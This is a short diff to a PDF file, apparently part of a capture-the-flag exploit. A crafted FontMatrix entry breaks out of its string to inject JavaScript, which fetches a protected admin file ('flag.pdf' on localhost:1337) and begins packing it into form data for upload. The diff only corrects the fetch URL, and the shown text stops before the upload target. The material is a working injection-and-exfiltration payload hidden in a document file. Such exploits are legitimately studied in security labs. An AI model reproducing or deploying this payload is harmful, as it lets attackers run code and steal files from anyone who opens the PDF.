@@ -28,7 +28,7 @@ endobj
 /LastChar 102
 /Encoding/WinAnsiEncoding
 /FontMatrix [0.1 0 0 0.1 0 (1\);
-  fetch\("localhost:1337/app/admin/flag.pdf"\)
+  fetch\("http://localhost:1337/app/admin/flag.pdf"\)
     .then\(response => {
       const formData = new FormData\(\);
       formData.append\('file', response.blob\(\), 'uploaded_file'\);
